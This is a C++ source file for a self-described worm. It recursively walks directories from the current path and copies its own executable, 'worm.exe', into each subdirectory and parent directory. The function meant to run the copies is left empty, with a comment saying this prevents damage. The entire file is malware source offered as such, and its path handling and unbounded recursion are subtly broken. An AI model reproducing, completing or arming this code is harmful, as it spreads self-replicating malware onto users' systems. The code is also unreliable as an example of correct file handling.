#include <filesystem>
#include <iostream>
#include <fstream>
#include <vector>
#include <cstdlib>
#include "dir-hist.h"

DirectoryHistory dirhist;
std::string malware_cpp_file = "worm.exe";

std::vector<std::string> checkChildren(const std::string& path) {
	// This function takes a path as input and returns a vector of subdirectories 
	// of the input path by iterating through the directory entries using the 
	// directory_iterator of the filesystem library.
	std::vector<std::string> sub_dirs;

	for (const auto& entry : std::filesystem::directory_iterator(path)) {
		if (entry.is_directory()) {
			sub_dirs.push_back(entry.path().filename().string());
		}
	}

	return sub_dirs;
}


void proliferate(std::string origin, std::string destination) {
	// This function takes an origin and a destination path as input, and copies the 
	// worm executable from the origin to the destination. It uses ifstream to read 
	// the worm executable as binary data, and ofstream to write it to the destination.
	std::string worm_location = origin + "/" + malware_cpp_file;

	std::string dest = origin + "/" + destination + malware_cpp_file;

	const int buffer_size = 1024;
	char buffer[buffer_size];

	std::ifstream src(worm_location, std::ios::binary);
	std::ofstream dst(dest, std::ios::binary);
	
	while (src.read(buffer, buffer_size)) {
		dst.write(buffer, src.gcount());
	}

	dst.write(buffer, src.gcount());

	src.close();
	dst.close();
}


void execute(){
	// This function does nothing except being called by the navigate function. 
	// It was intended to execute the worm executable, but the code was commented out 
	// to prevent unintentional damage.
}


std::filesystem::path navigate(std::filesystem::path origin, std::vector<std::string> sub_dirs) {
	// This function takes a path and a vector of subdirectories as input, and recursively 
	// navigates through the directory structure, copying the worm executable to new 
	// directories and executing it. It uses the directory history object to keep track of 
	// visited directories.
	if (!sub_dirs.empty()) {
		for (const std::string& subs : sub_dirs) {
			if (dirhist.directoryExists(origin.string() + "/" + subs)){
				continue;
			}
			dirhist.addDirectory(origin.string() + "/" + subs);
			proliferate(origin.string(), subs);
			execute();
			std::filesystem::path newOrigin(origin.string() + "/" + subs);
			std::vector<std::string> sub_sub_dirs = checkChildren(origin.string() + "/" + subs);
			return navigate(newOrigin, sub_sub_dirs);
		}
	}
	std::string parent = origin.parent_path().string();
	dirhist.addDirectory(parent);
	proliferate(origin.string(), parent);
	execute();
	origin = origin.parent_path();
	std::vector<std::string> parent_sub_dirs = checkChildren(origin.string());
	return navigate(origin, parent_sub_dirs);
}


int main() {
	// This is the main function that initiates the worm execution by calling the navigate function. 
	// It gets the current path using the current_path() function from the filesystem library, and 
	// calls the checkChildren and navigate functions to start the recursive execution.
	std::filesystem::path origin = std::filesystem::current_path();

	std::vector<std::string> sub_dirs = checkChildren(origin.string());
	navigate(origin, sub_dirs);
	return 0;
}

